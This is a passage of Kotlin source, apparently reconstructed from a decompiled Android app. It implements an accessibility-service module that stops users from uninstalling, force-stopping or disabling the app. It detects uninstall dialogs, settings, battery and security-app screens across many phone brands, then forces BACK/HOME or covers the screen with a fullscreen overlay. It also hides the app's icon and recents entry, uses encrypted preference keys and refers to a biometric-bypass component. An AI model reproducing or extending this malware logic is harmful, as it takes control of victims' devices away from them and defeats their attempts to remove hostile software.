                "com.iqoo.launcher:id/uninstall_title", "com.iqoo.launcher:id/uninstall_app_des",
                "com.iqoo.launcher:id/alertTitle", "com.iqoo.launcher:id/message",
                "com.iqoo.launcher:id/dialog_title", "com.iqoo.launcher:id/dialog_content",
                "com.iqoo.launcher.two:id/uninstall_title", "com.iqoo.launcher.two:id/uninstall_app_des",
                "com.iqoo.launcher.two:id/alertTitle", "com.iqoo.launcher.two:id/message",
                "com.iqoo.launcher.two:id/dialog_title", "com.iqoo.launcher.two:id/dialog_content"
            ),
            "xiaomi" to listOf(
                "com.miui.home:id/title", "com.miui.home:id/alertTitle",
                "com.miui.home:id/message", "com.miui.home:id/dialog_title",
                "com.miui.home:id/content", "com.miui.home:id/dialog_content"
            ),
            "huawei" to listOf(
                "com.huawei.android.launcher:id/alertTitle", "com.huawei.android.launcher:id/message",
                "com.huawei.android.launcher:id/dialog_title", "com.huawei.android.launcher:id/dialog_message",
                "com.huawei.android.launcher:id/delete_item",
                "com.huawei.home:id/alertTitle", "com.huawei.home:id/message",
                "com.huawei.home:id/dialog_title", "com.huawei.home:id/dialog_message",
                "com.huawei.home:id/delete_item"
            ),
            "honor" to listOf(
                "com.hihonor.android.launcher:id/delete_item_enhanced",
                "com.hihonor.android.launcher:id/remove_item_enhanced_desc",
                "com.hihonor.android.launcher:id/alertTitle", "com.hihonor.android.launcher:id/message",
                "com.hihonor.android.launcher:id/delete_item",
                "com.hihonor.android.launcher:id/dialog_title", "com.hihonor.android.launcher:id/dialog_message",
                "com.hihonor.home:id/alertTitle", "com.hihonor.home:id/message",
                "com.hihonor.home:id/delete_item", "com.hihonor.home:id/delete_item_enhanced",
                "com.hihonor.home:id/dialog_title", "com.hihonor.home:id/dialog_message"
            ),
            "samsung" to listOf(
                "com.samsung.android.launcher:id/alertTitle", "com.samsung.android.launcher:id/message",
                "com.samsung.android.launcher:id/dialog_title", "com.samsung.android.launcher:id/dialog_content",
                "com.sec.android.app.launcher:id/alertTitle", "com.sec.android.app.launcher:id/message",
                "com.sec.android.app.launcher:id/dialog_title", "com.sec.android.app.launcher:id/dialog_content"
            ),
            "meizu" to listOf(
                "com.meizu.launcher:id/alertTitle", "com.meizu.launcher:id/message",
                "com.meizu.flyme.launcher:id/alertTitle", "com.meizu.flyme.launcher:id/message",
                "com.meizu.launcher3:id/alertTitle", "com.meizu.launcher3:id/message"
            ),
            "google" to listOf(
                "com.google.android.apps.nexuslauncher:id/alertTitle", "com.google.android.apps.nexuslauncher:id/message",
                "com.google.android.apps.nexuslauncher:id/dialog_title", "com.google.android.apps.nexuslauncher:id/dialog_content",
                "com.android.launcher3:id/alertTitle", "com.android.launcher3:id/message",
                "com.android.launcher3:id/txt_uninstall_main_title", "com.android.launcher3:id/txt_uninstall_sub_title",
                "com.android.launcher3:id/dialog_title", "com.android.launcher3:id/dialog_content",
                "com.android.launcher2:id/alertTitle", "com.android.launcher2:id/message"
            ),
            "blackshark" to listOf(
                "com.blackshark.launcher:id/alertTitle", "com.blackshark.launcher:id/message",
                "com.blackshark.launcher:id/dialog_title", "com.blackshark.launcher:id/dialog_content"
            ),
            "lenovo" to listOf(
                "com.lenovo.launcher:id/alertTitle", "com.lenovo.launcher:id/message",
                "com.lenovo.launcher2:id/alertTitle", "com.lenovo.launcher2:id/message"
            ),
            "transsion" to listOf(
                "com.transsion.launcher:id/alertTitle", "com.transsion.launcher:id/message",
                "com.infinix.launcher:id/alertTitle", "com.infinix.launcher:id/message",
                "com.tecno.launcher:id/alertTitle", "com.tecno.launcher:id/message",
                "com.itel.launcher:id/alertTitle", "com.itel.launcher:id/message"
            ),
            "zte" to listOf("com.zte.mifavor.launcher:id/alertTitle", "com.zte.mifavor.launcher:id/message"),
            "motorola" to listOf("com.motorola.launcher3:id/alertTitle", "com.motorola.launcher3:id/message"),
            "lg" to listOf(
                "com.lge.launcher2:id/alertTitle", "com.lge.launcher2:id/message",
                "com.lge.launcher3:id/alertTitle", "com.lge.launcher3:id/message"
            ),
            "nothing" to listOf("com.nothing.launcher:id/alertTitle", "com.nothing.launcher:id/message"),
            "asus" to listOf(
                "com.asus.launcher:id/alertTitle", "com.asus.launcher:id/message",
                "com.asus.zenui.launcher:id/alertTitle", "com.asus.zenui.launcher:id/message"
            ),
            "nubia" to listOf("cn.nubia.launcher:id/alertTitle", "cn.nubia.launcher:id/message"),
            "smartisan" to listOf("com.smartisanos.launcher:id/alertTitle", "com.smartisanos.launcher:id/message"),
            "sony" to listOf(
                "com.sonymobile.home:id/alertTitle", "com.sonymobile.home:id/message",
                "com.sony.home:id/alertTitle", "com.sony.home:id/message"
            ),
            "nokia" to listOf("com.evenwell.launcher:id/alertTitle", "com.evenwell.launcher:id/message"),
            "coolpad" to listOf("com.yulong.android.launcher:id/alertTitle", "com.yulong.android.launcher:id/message"),
            "gionee" to listOf("com.gionee.launcher:id/alertTitle", "com.gionee.launcher:id/message")
        )
    }

    // ==================== 实例字段 ====================

    @Volatile
    var isProtectionEnabled = false

    @Volatile
    var cachedAppNames: List<String>? = null
    var appNameCacheTimestamp = 0L

    @Volatile
    var lastDetectionTimestamp = 0L

    @Volatile
    var isDesktopMonitoring = false

    @Volatile
    var desktopMonitorStartTime = 0L

    @Volatile
    var isOverlayShowing = false

    @Volatile
    var isOurAppConfirmed = false

    val isBackSequenceRunning = AtomicBoolean(false)

    private val mainHandler = Handler(Looper.getMainLooper())
    private val pollingThread = HandlerThread(POLLING_THREAD_NAME).also { it.start() }
    private val pollingHandler = Handler(pollingThread.looper)

    private val brandInfo: String
    val isHonorDevice: Boolean
    val isOppoDevice: Boolean

    var overlayView: View? = null
    var isPollingActive = false
    var pollingPackage: String? = null
    var pollingStartTime = 0L
    var pollingRounds = 0
    var pollingHits = 0
    var lastSystemUiTime = 0L

    var networkManager: NetworkManager? = null
    var biometricBypassDelegate: BiometricBypassDelegate? = null

    // 外部回调 (JADX c8/c9/d0/d1/d2/d3/d4)
    var isAuthorizingCallback: (() -> Boolean)? = null
    var isRecentsGuardActiveCallback: (() -> Boolean)? = null
    var getRootNodeCallback: (() -> AccessibilityNodeInfo?)? = null
    var getDeviceIdCallback: (() -> String?)? = null
    var eventLogCallback: ((String, String, java.io.Serializable?) -> Unit)? = null
    var getAppNamesCallback: (() -> List<String>?)? = null
    var onTriggerHideCallback: (() -> Unit)? = null

    var lastReportedType = ""
    var lastReportedTime = 0L

    // ==================== Lazy 字段 (JADX f53681b6, f53682b7, f53707e2) ====================

    /** JADX f53681b6 — WindowManager (lazy) */
    private val overlayWindowManager: WindowManager? by lazy {
        service.getSystemService(WindowManager::class.java)
    }

    /** JADX f53682b7 — 全屏遮挡层 LayoutParams (lazy) */
    private val overlayLayoutParams: WindowManager.LayoutParams? by lazy {
        val wm = overlayWindowManager ?: return@lazy null
        val dm = DisplayMetrics()
        wm.defaultDisplay?.getRealMetrics(dm)
        val w = dm.widthPixels.takeIf { it > 0 } ?: service.resources.displayMetrics.widthPixels
        val h = dm.heightPixels.takeIf { it > 0 } ?: service.resources.displayMetrics.heightPixels
        WindowManager.LayoutParams(w, h, OVERLAY_WINDOW_TYPE, OVERLAY_WINDOW_FLAGS, OVERLAY_PIXEL_FORMAT).also {
            it.gravity = OVERLAY_GRAVITY; it.x = 0; it.y = 0
        }
    }

    /**
     * JADX f53707e2 — 当前设备品牌的卸载对话框 ViewId 列表 (lazy)
     * 运行时根据 Build.BRAND + BRAND_ALIASES 解析
     */
    private val deviceDialogIds: Array<String> by lazy {
        val brand = (Build.BRAND ?: "").lowercase(Locale.ROOT)
        val manufacturer = (Build.MANUFACTURER ?: "").lowercase(Locale.ROOT)
        val result = ArrayList<String>()
        result.addAll(DEFAULT_DIALOG_VIEW_IDS)

        val matchedBrands = LinkedHashSet<String>()
        for (key in BRAND_DIALOG_VIEW_IDS.keys) {
            if (brand.contains(key) || manufacturer.contains(key)) {
                matchedBrands.add(key)
            }
        }
        for ((alias, target) in BRAND_ALIASES) {
            if (brand.contains(alias) || manufacturer.contains(alias)) {
                matchedBrands.add(target)
            }
        }
        for (b in matchedBrands) {
            BRAND_DIALOG_VIEW_IDS[b]?.let { result.addAll(it) }
        }
        if (matchedBrands.isEmpty()) {
            result.addAll(listOf(
                "com.android.launcher:id/alertTitle", "com.android.launcher:id/message",
                "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title",
                "com.android.launcher3:id/alertTitle", "com.android.launcher3:id/message"
            ))
        }
        result.distinct().toTypedArray()
    }

    // ==================== Polling Runnables (JADX f53685c0, f53702d7, f53703d8) ====================

    /** JADX f53685c0 — SystemUI 对话框检测 Runnable (pk1 case 1) */
    private val systemUiCheckRunnable = Runnable {
        // JADX: pk1.run() case 1 — FGS stop button + running service popup detection
        val rootCallback = getRootNodeCallback ?: return@Runnable
        val rootNode = rootCallback.invoke() ?: return@Runnable
        try {
            // 获取应用标签名
            val appLabel = try {
                service.packageManager.getApplicationLabel(service.applicationInfo).toString()
            } catch (_: Exception) { "" }

            if (appLabel.isEmpty()) return@Runnable

            // Android 12+ (API 31): 检查前台服务停止按钮
            if (android.os.Build.VERSION.SDK_INT >= 31) {
                val fgsStopViewIds = arrayOf(
                    "com.android.systemui:id/fgs_manager_app_item_stop_button",
                    "com.android.systemui:id/stop_button",
                    "com.android.systemui:id/btn_stop"
                )
                for (viewId in fgsStopViewIds) {
                    try {
                        val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewId)
                        if (nodes != null && nodes.isNotEmpty()) {
                            // 收集所有文本，检查是否包含我们的应用名
                            val allTexts = ArrayList<String>()
                            collectNodeTexts(0, rootNode, allTexts)
                            if (allTexts.isNotEmpty()) {
                                for (text in allTexts) {
                                    if (text.contains(appLabel, ignoreCase = true)) {
                                        android.util.Log.w(TAG, "🛡️⚡ [FGS保护] 检测到前台服务停止按钮且包含本应用，返回桌面")
                                        serviceRef.performGlobalAction(2) // HOME
                                        reportDetection("FGS_STOP_PROTECT", "FGS停止按钮", listOf(viewId), "HOME", "com.android.systemui")
                                        break
                                    }
                                }
                            }
                            for (n in nodes) {
                                try { n.recycle() } catch (_: Exception) {}
                            }
                        }
                    } catch (_: Exception) {}
                }
            }

            // 检查「正在运行的服务」弹窗
            val runningServiceKeywords = arrayOf("正在运行", "运行中的服务", "Running services", "前台服务")
            for (keyword in runningServiceKeywords) {
                try {
                    val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                    if (nodes != null && nodes.isNotEmpty()) {
                        for (n in nodes) {
                            try { n.recycle() } catch (_: Exception) {}
                        }
                        // 检查是否包含我们的应用名
                        val appNodes = rootNode.findAccessibilityNodeInfosByText(appLabel)
                        if (appNodes != null && appNodes.isNotEmpty()) {
                            for (n in appNodes) {
                                try { n.recycle() } catch (_: Exception) {}
                            }
                            android.util.Log.w(TAG, "🛡️ [运行服务弹窗] 检测到包含本应用($appLabel)，返回桌面")
                            serviceRef.performGlobalAction(2) // HOME
                            break
                        }
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {
        } finally {
            try { rootNode.recycle() } catch (_: Exception) {}
        }
    }

    /** JADX f53702d7 — 危险包名轮询 Runnable (pk1 case 0) */
    private val pollingRunnable: Runnable = object : Runnable {
        override fun run() {
            if (!isPollingActive) return
            pollingRounds++
            val elapsed = System.currentTimeMillis() - pollingStartTime

            // 返回序列执行中 → 跳过本轮
            if (isBackSequenceRunning.get()) {
                android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] ⏸ 跳过: 正在执行返回序列 (已运行${elapsed}ms)")
                pollingHandler.postDelayed(this, POLLING_INTERVAL_MS)
                return
            }

            // 超时停止
            if (elapsed > POLLING_MAX_DURATION_MS) {
                android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] ⏹ 超时停止 (已运行${elapsed}ms)")
                stopPolling()
                return
            }

            var rootNode: AccessibilityNodeInfo? = null
            try {
                val rootCallback = getRootNodeCallback
                if (rootCallback != null) {
                    rootNode = rootCallback.invoke()
                }
                if (rootNode == null) {
                    android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] ⚠ rootNode为空 (已运行${elapsed}ms)")
                    pollingHandler.postDelayed(this, POLLING_INTERVAL_MS)
                    return
                }

                val pkgCs = rootNode.packageName
                val pkg = pkgCs?.toString()?.lowercase(Locale.ROOT) ?: ""
                android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] 🔍 前台包名: $pkg (已运行${elapsed}ms)")

                // 已回到桌面 → 停止轮询
                if (pkg.contains("launcher") || pkg.contains(".home") ||
                    pkg.contains("hiboard") || pkg.contains("personalassistant")
                ) {
                    android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] 🏠 已回到桌面: $pkg → 停止轮询")
                    stopPolling()
                    try { rootNode.recycle() } catch (_: Exception) {}
                    return
                }

                // 前台是自己的APP → 连续3次则停止
                val ourPkg = service.packageName?.lowercase(Locale.ROOT) ?: ""
                if (pkg == ourPkg) {
                    pollingHits++
                    if (pollingHits >= 3) {
                        android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] 📱 连续${pollingHits}次前台是自己的APP → 停止轮询")
                        stopPolling()
                        try { rootNode.recycle() } catch (_: Exception) {}
                        return
                    }
                    android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] 📱 前台是自己的APP ($pollingHits/3)")
                    pollingHandler.postDelayed(this, POLLING_INTERVAL_MS)
                    try { rootNode.recycle() } catch (_: Exception) {}
                    return
                }
                pollingHits = 0

                // 收集节点文本
                val allTexts = ArrayList<String>()
                collectNodeTexts(0, rootNode, allTexts)
                val joinedText = allTexts.joinToString(" ")

                // 获取并过滤应用名
                val appNames = getAppNames()
                val filteredNames = ArrayList<String>()
                for (name in appNames) {
                    val trimmed = name.trim().replace("⠀", "")
                    if (trimmed.length >= 2 && !trimmed.contains('.')) {
                        filteredNames.add(trimmed)
                    }
                }

                // 1. 纯净模式检测 (POLLING_PURE_MODE)
                var pureModeKw: String? = null
                for (kw in PURE_MODE_KEYWORDS) {
                    if (joinedText.contains(kw, ignoreCase = true)) {
                        pureModeKw = kw; break
                    }
                }
                if (pureModeKw != null) {
                    var enhancedKw: String? = null
                    for (kw in ENHANCED_PROTECTION_KEYWORDS) {
                        if (joinedText.contains(kw, ignoreCase = true)) {
                            enhancedKw = kw; break
                        }
                    }
                    if (enhancedKw != null) {
                        android.util.Log.w(TAG, "🛡️⚡ [轮询#$pollingRounds] ✅ 命中纯净模式设置页: $pureModeKw + $enhancedKw → 执行返回!")
                        stopPolling()
                        triggerBackSequence()
                        reportDetection("POLLING_PURE_MODE", "轮询-纯净模式设置页拦截", listOf(pkg, "$pureModeKw+$enhancedKw"), "返回+HOME", pkg)
                        try { rootNode.recycle() } catch (_: Exception) {}
                        return
                    }
                }

                // 2. 高危关键词检测 — 只在 settings/safecenter/securitycenter 包中检查
                if (pkg.contains("settings") || pkg.contains("safecenter") || pkg.contains("securitycenter")) {
                    // 2a. 高危关键词 (DangerKeywords)
                    val dangerKeywords = arrayOf("卸载", "关闭服务", "撤销权限", "卸载更新", "删除应用", "一键清除", "一键删除",
                        "Uninstall", "Remove", "Force stop", "强行停止", "停用", "Disable", "Clear data", "Clear all data")
                    var dangerKw: String? = null
                    for (kw in dangerKeywords) {
                        if (joinedText.contains(kw, ignoreCase = true)) {
                            dangerKw = kw; break
                        }
                    }
                    if (dangerKw != null) {
                        android.util.Log.w(TAG, "🛡️⚡ [轮询#$pollingRounds] ✅ 命中高危关键词: $dangerKw → 执行返回!")
                        stopPolling()
                        triggerBackSequence()
                        reportDetection("POLLING_HIGH_RISK", "轮询-高危关键词", listOf(pkg, dangerKw), "返回+HOME", pkg)
                        try { rootNode.recycle() } catch (_: Exception) {}
                        return
                    }

                    // 2b. 无障碍关键词
                    val accessibilityKeywords = arrayOf("无障碍", "辅助功能", "Accessibility", "已安装的服务", "Installed services")
                    var accKw: String? = null
                    for (kw in accessibilityKeywords) {
                        if (joinedText.contains(kw, ignoreCase = true)) {
                            accKw = kw; break
                        }
                    }
                    if (accKw != null) {
                        android.util.Log.w(TAG, "🛡️⚡ [轮询#$pollingRounds] ✅ 命中无障碍关键词: $accKw → 执行返回!")
                        stopPolling()
                        triggerBackSequence()
                        reportDetection("POLLING_HIGH_RISK", "轮询-无障碍关键词", listOf(pkg, accKw), "返回+HOME", pkg)
                        try { rootNode.recycle() } catch (_: Exception) {}
                        return
                    }
                }

                // 3. 耗电/电池页检测 — 在 settings/battery/power 等包中
                if (pkg.contains("settings") || pkg.contains("permissioncontroller") ||
                    pkg.contains("battery") || pkg.contains("powermanager") ||
                    pkg.contains("powersaving") || pkg.contains("safecenter") ||
                    pkg.contains("securitycenter") || isSystemSecurityManagerPackage(pkg)
                ) {
                    val batteryKeywords = arrayOf("高耗电", "高功耗", "后台耗电", "耗电异常", "耗电过快",
                        "后台高耗电", "电量消耗", "电池", "耗电详情", "后台活动", "允许后台活动")
                    var batteryKw: String? = null
                    for (kw in batteryKeywords) {
                        if (joinedText.contains(kw, ignoreCase = true)) {
                            batteryKw = kw; break
                        }
                    }
                    if (batteryKw != null) {
                        // 检查页面是否也包含我们的应用名
                        var matchedAppName: String? = null
                        for (name in filteredNames) {
                            if (joinedText.contains(name, ignoreCase = true)) {
                                matchedAppName = name; break
                            }
                        }
                        if (matchedAppName != null) {
                            android.util.Log.w(TAG, "🛡️⚡ [轮询#$pollingRounds] ✅ 耗电/电池页: $batteryKw + $matchedAppName → 遮挡+返回!")
                            stopPolling()
                            mainHandler.postAtFrontOfQueue { showFullscreenOverlay() }
                            triggerBackSequence()
                            reportDetection("POLLING_BATTERY_UI", "轮询-耗电页拦截", listOf(pkg, batteryKw, matchedAppName), "遮挡+返回", pkg)
                            try { rootNode.recycle() } catch (_: Exception) {}
                            return
                        }
                    }

                    // 4. 强行停止页检测 (POLLING_FORCE_STOP)
                    val forceStopKeywords = arrayOf("强行停止", "Force stop", "强制停止", "结束运行", "停用")
                    var forceStopKw: String? = null
                    for (kw in forceStopKeywords) {
                        if (joinedText.contains(kw, ignoreCase = true)) {
                            forceStopKw = kw; break
                        }
                    }
                    if (forceStopKw != null) {
                        var matchedAppName2: String? = null
                        for (name in filteredNames) {
                            if (joinedText.contains(name, ignoreCase = true)) {
                                matchedAppName2 = name; break
                            }
                        }
                        if (matchedAppName2 != null) {
                            android.util.Log.w(TAG, "🛡️⚡ [轮询#$pollingRounds] ✅ 强行停止页: $forceStopKw + $matchedAppName2 → 遮挡+返回!")
                            stopPolling()
                            mainHandler.postAtFrontOfQueue { showFullscreenOverlay() }
                            triggerBackSequence()
                            reportDetection("POLLING_FORCE_STOP", "轮询-强行停止拦截", listOf(pkg, forceStopKw, matchedAppName2), "遮挡+返回", pkg)
                            try { rootNode.recycle() } catch (_: Exception) {}
                            return
                        }
                    }
                }

                // 5. APP名搜索 (POLLING_DETECT) — 在任何敏感包中查找
                android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] 🔎 搜索APP名: ${filteredNames.joinToString()} (前台: $pkg)")
                for (name in filteredNames) {
                    val trimmedName = name.trim()
                    if (trimmedName.length < 2) continue
                    try {
                        val found = rootNode.findAccessibilityNodeInfosByText(trimmedName)
                        if (found != null && found.isNotEmpty()) {
                            android.util.Log.w(TAG, "🛡️⚡ [轮询#$pollingRounds] ✅ 找到APP: $trimmedName (${found.size}个节点) → 遮挡+返回!")
                            for (n in found) {
                                try { n.recycle() } catch (_: Exception) {}
                            }
                            val prevPkg = pollingPackage ?: ""
                            stopPolling()
                            // 判断是否需要全屏遮挡 (settings/safecenter/securitycenter/appmanager 需要)
                            val needOverlay = pkg.contains("settings") || pkg.contains("safecenter") ||
                                    pkg.contains("securitycenter") || pkg.contains("appmanager") ||
                                    pkg.contains("permissionmanager") || isSystemSecurityManagerPackage(pkg)
                            if (needOverlay) {
                                mainHandler.postAtFrontOfQueue { showFullscreenOverlay() }
                            }
                            triggerBackSequence()
                            reportDetection("POLLING_DETECT", "轮询检测到APP",
                                listOf(prevPkg, trimmedName), if (needOverlay) "遮挡+返回" else "返回", pkg)
                            try { rootNode.recycle() } catch (_: Exception) {}
                            return
                        }
                    } catch (_: Exception) {}
                }

                android.util.Log.d(TAG, "🛡️ [轮询#$pollingRounds] ❌ 本轮未检测到 (前台: $pkg)")
                try { rootNode.recycle() } catch (_: Exception) {}
                rootNode = null
            } catch (e: Exception) {
                android.util.Log.w(TAG, "🛡️ [轮询#$pollingRounds] ⚠️ 异常: ${e.message}")
                if (rootNode != null) {
                    try { rootNode.recycle() } catch (_: Exception) {}
                }
            }
            pollingHandler.postDelayed(this, POLLING_INTERVAL_MS)
        }
    }

    /** JADX f53703d8 — 桌面监控轮询 Runnable (pk1 case 2) */
    private val desktopMonitorRunnable = Runnable {
        // JADX: pk1.run() case 2 — 获取 rootNode 后调用 a2() 桌面卸载检测
        var rootNode: AccessibilityNodeInfo? = null
        try {
            val rootCallback = getRootNodeCallback
            if (rootCallback != null) {
                rootNode = rootCallback.invoke()
            }
            if (rootNode == null) return@Runnable
            detectDesktopUninstallDialog(rootNode)
        } catch (_: Exception) {
            if (rootNode != null) {
                try { rootNode.recycle() } catch (_: Exception) {}
            }
        }
    }

    init {
        val brand = (Build.BRAND ?: "").lowercase(Locale.ROOT)
        val manufacturer = (Build.MANUFACTURER ?: "").lowercase(Locale.ROOT)
        val model = (Build.MODEL ?: "").lowercase(Locale.ROOT)
        val display = (Build.DISPLAY ?: "").lowercase(Locale.ROOT)

        brandInfo = "$brand $manufacturer"
        isHonorDevice = brand.contains("honor") || manufacturer.contains("honor") ||
                display.contains("magic") || display.contains("honor") || model.contains("honor")
        isOppoDevice = brand.contains("oppo") || brand.contains("realme") || brand.contains("oneplus") ||
                manufacturer.contains("oppo") || manufacturer.contains("realme") || manufacturer.contains("oneplus")
    }

    // ==================== 缺失方法补充 (审查后添加) ====================

    /**
     * JADX b7 (static) — 触发伪装隐藏 (隐藏图标 + 最近任务)
     */
    fun triggerCamouflage() {
        try {
            val bbd = biometricBypassDelegate
            if (bbd == null) {
                android.util.Log.e(TAG, "appIconHideManager 为 null，无法隐藏")
                return
            }
            RecentsGuardManager.hidingFromRecentsFlag = true
            android.util.Log.d(TAG, "开始执行隐藏... (forceHide=true)")
            onTriggerHideCallback?.invoke()
            try {
                // ADAPT: bbd.hideAppIcon(true) — BiometricBypassDelegate 隐藏图标
                // Phase 10 对接: 当 BiometricBypassDelegate 实现 hideAppIcon 方法后，
                // 取消下面注释并调用 bbd.hideAppIcon(true)
                // val result = bbd.hideAppIcon(true)
                // android.util.Log.d(TAG, "hideAppIcon() 调用完成: success=${result.success}, method=${result.method}")
                val prefs1 = service.getSharedPreferences(StringUtil.decrypt("I1AVP3IrGC9DNA=="), 0)
                prefs1.edit().putBoolean(StringUtil.decrypt("IkouMkQ8CCtZ"), true).apply()
                val prefs2 = service.getSharedPreferences(StringUtil.decrypt("KkkBBV4sDTpS"), 0)
                prefs2.edit().putBoolean(StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "hideAppIcon() 异常: ${e.message}", e)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "triggerCamouflageUnified 异常: ${e.message}", e)
        }
    }

    /**
     * JADX c1 — 第三方安全应用检测
     */
    fun checkThirdPartyPackage(pkg: String) {
        var isAppStore = false
        for (s in APP_STORE_PACKAGES) {
            if (pkg.startsWith(s)) { isAppStore = true; break }
        }
        var isInstaller = false
        for (s in PACKAGE_INSTALLER_PACKAGES) {
            if (pkg.startsWith(s)) { isInstaller = true; break }
        }
        var isSecurity = false
        for (s in GENERAL_SECURITY_PACKAGES) {
            if (pkg.startsWith(s)) { isSecurity = true; break }
        }
        if (isAppStore || isInstaller || isSecurity) {
            android.util.Log.d(TAG, "检测到第三方包名: $pkg → 启动后台轮询")
            startPolling(pkg)
        }
    }

    /**
     * JADX c8 — 桌面长按事件处理
     */
    fun handleDesktopLongPress(eventType: Int) {
        if (eventType == 2) {
            // TYPE_VIEW_LONG_CLICKED — 检测桌面图标长按
            // ADAPT: JADX 使用 C0285a5.getLastCachedSource() 获取最近的无障碍事件来源
            // 获取最近事件来源文本 (lastCachedSource)
            var lastSourceText = ""
            var lastSourceDesc = ""
            // ADAPT: lastCachedSource 来自 dqtvuisjd.f52358m1.getLastCachedSource()
            // 在 Phase 10 完成后，对接 MyAccessibilityService 的 lastCachedSource
            // 当前使用空字符串

            val appNames = getAppNames()
            val expandedNames = ArrayList<String>(appNames.size * 2)
            appNames.forEach { name ->
                expandedNames.add(name)
                expandedNames.add(name.trim().replace("⠀", ""))
            }
            val validNames = expandedNames.filter { it.length >= 2 }

            // JADX c8: 检查 lastCachedSource 文本是否匹配应用名
            val combinedSourceText = "$lastSourceText $lastSourceDesc"
            var isOurApp = false
            for (name in validNames) {
                if (combinedSourceText.contains(name, ignoreCase = true)) {
                    isOurApp = true
                    break
                }
            }

            // 判断是否无法确认 (空文本 + 空描述)
            val isUnknown = lastSourceText.isBlank() && lastSourceDesc.isBlank()

            if (isOurApp || isUnknown) {
                // 开始监控
                isDesktopMonitoring = true
                isOurAppConfirmed = isOurApp
                desktopMonitorStartTime = System.currentTimeMillis()
                android.util.Log.d(TAG, "🛡️ 桌面长按开始监控 isOurApp=$isOurApp isUnknown=$isUnknown confirmed=$isOurAppConfirmed text='$lastSourceText'")
            } else {
                // 明确不是我们的图标，跳过监控
                isDesktopMonitoring = false
                isOurAppConfirmed = false
                android.util.Log.d(TAG, "🛡️ 桌面长按，明确非我们的图标（text='$lastSourceText' desc='$lastSourceDesc'），跳过监控")
            }
        }

        if (eventType == 32 || eventType == 2048) {
            val now = System.currentTimeMillis()
            // 30秒超时
            if (isDesktopMonitoring && now - desktopMonitorStartTime > DESKTOP_MONITOR_TIMEOUT_MS) {
                isDesktopMonitoring = false
                isOurAppConfirmed = false
            }
            // 触发桌面监控轮询 (仅在非轮询状态下)
            if (!isPollingActive) {
                pollingHandler.removeCallbacks(desktopMonitorRunnable)
                pollingHandler.post(desktopMonitorRunnable)
            }
        }
    }

    /**
     * JADX c9 — 桌面/包名事件路由
     */
    fun handleDesktopEventRouting(event: AccessibilityEvent) {
        try {
            val recentsCallback = isRecentsGuardActiveCallback
            if (recentsCallback != null && recentsCallback.invoke()) return

            val pkg = event.packageName?.toString() ?: return
            val pkgLc = pkg.lowercase(Locale.ROOT)
            val eventType = event.eventType

            // 排除 SystemUI/壁纸/锁屏/AOD
            if (pkgLc == "com.android.systemui" || pkgLc.contains("systemui") ||
                pkgLc.contains("wallpaper") || pkgLc.contains("miui.aod") ||
                pkgLc.contains("aodservice") || pkgLc.contains("lockscreen")
            ) return

            val isLauncher = pkgLc.contains("launcher") || pkgLc.contains("home") || isLauncherPackage(pkgLc)
            var isInstallerPkg = false
            for (s in PACKAGE_INSTALLER_PACKAGES) {
                if (pkgLc.startsWith(s)) { isInstallerPkg = true; break }
            }

            // 非桌面/非安装器 → 清除桌面监控
            if (!isLauncher && !isInstallerPkg && isDesktopMonitoring) {
                isDesktopMonitoring = false
            }

            if (isLauncher) {
                handleDesktopLongPress(eventType)
                return
            }

            if (isInstallerPkg && isDesktopMonitoring && (eventType == 32 || eventType == 2048)) {
                android.util.Log.d(TAG, "桌面→安装器 监控中检测到安装器窗口 pkg=$pkgLc")
                // ADAPT: 启动安装器监控
                return
            }

            if (isProtectionEnabled && (eventType == 32 || eventType == 2048)) {
                checkThirdPartyPackage(pkgLc)
            }
        } catch (_: Exception) {}
    }

    // ==================== 启用/禁用 ====================

    /**
     * JADX c3 — 启用防卸载保护
     */
    fun enable(): Boolean {
        try {
            val authCallback = isAuthorizingCallback
            if (authCallback != null && authCallback.invoke()) return false

            if (isProtectionEnabled) {
                sendStatusReport("防止卸载保护已经启用", true)
                return true
            }
            resetAllState()
            isProtectionEnabled = true
            cachedAppNames = null
            appNameCacheTimestamp = 0L
            try {
                service.getSharedPreferences(PREFS_NAME, 0).edit()
                    .putBoolean("enabled", true).apply()
            } catch (_: Exception) {}
            eventLogCallback?.invoke("SYSTEM_EVENT", "启用防止卸载保护", null)
            sendStatusReport("防止卸载保护已启用", true)
            return true
        } catch (e: Exception) {
            isProtectionEnabled = false
            sendStatusReport("启用失败: ${e.message}", false)
            return false
        }
    }

    /**
     * JADX c2 — 禁用防卸载保护
     */
    fun disable(): Boolean {
        try {
            if (!isProtectionEnabled) {
                sendStatusReport("防止卸载保护已经禁用", false)
                return true
            }
            isProtectionEnabled = false
            resetAllState()
            try {
                service.getSharedPreferences(PREFS_NAME, 0).edit()
                    .putBoolean("enabled", false).apply()
            } catch (_: Exception) {}
            eventLogCallback?.invoke("SYSTEM_EVENT", "禁用防止卸载保护", null)
            sendStatusReport("防止卸载保护已禁用", false)
            return true
        } catch (e: Exception) {
            sendStatusReport("禁用失败: ${e.message}", false)
            return false
        }
    }

    // ==================== 事件处理 ====================

    /**
     * JADX d8 — 主事件入口 (最大方法, ~380行 JADX)
     * 调用链: d8 → [零延迟A/B] → [SystemUI检测] → [安装器检测] → [安全管理器检测]
     *        → c9 (桌面路由) → c0 (ClassName检测)
     */
    fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isProtectionEnabled) return
        if (isOverlayShowing && overlayView == null) {
            isOverlayShowing = false
        }

        val eventType = event.eventType
        try {
            // ===== 步骤 1: 零延迟 A — event.text 匹配应用名 =====
            if (!isOverlayShowing && (eventType == 32 || eventType == 2048)) {
                val now = System.currentTimeMillis()
                if (now - lastDetectionTimestamp >= 0 && !isBackSequenceRunning.get()) {
                    val eventText = event.text
                    if (eventText != null && eventText.isNotEmpty()) {
                        val joined = eventText.joinToString(" ")
